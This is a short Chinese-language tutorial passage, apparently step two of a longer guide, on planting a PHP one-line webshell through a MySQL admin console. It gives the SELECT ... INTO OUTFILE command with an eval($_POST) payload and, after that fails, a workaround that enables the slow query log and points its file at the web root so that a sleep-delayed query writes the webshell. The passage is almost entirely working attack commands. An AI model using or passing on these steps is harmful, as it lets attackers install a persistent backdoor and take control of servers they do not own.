二、登录数据口后台，写入一句话木马

select '<?php eval($\_POST\[x\]);?>' into outfile 'c:/phpstudy/www/xx.php'

执行的时候报错

  

![](../Images/8595e73548a37ccfeb3c5a0adf9ee6f2.png)

  

解决方法：

1、设置slow\_query\_log=1 启用慢查询日志。

  

![](../Images/25aef651fe0592c84b508a72eb4bd1cd.png)

  

2、修改slow\_query\_log\_file日志文件的绝对路径以及文件名

set global slow\_query\_log\_file='c:/phpstudy/www/xx.php'

  

![](../Images/6e3330651385b625608badb9ccd80959.png)

  

3、向日志文件写入一句话

select '<?php eval($\_POST\[x\]);?>' or sleep(11)
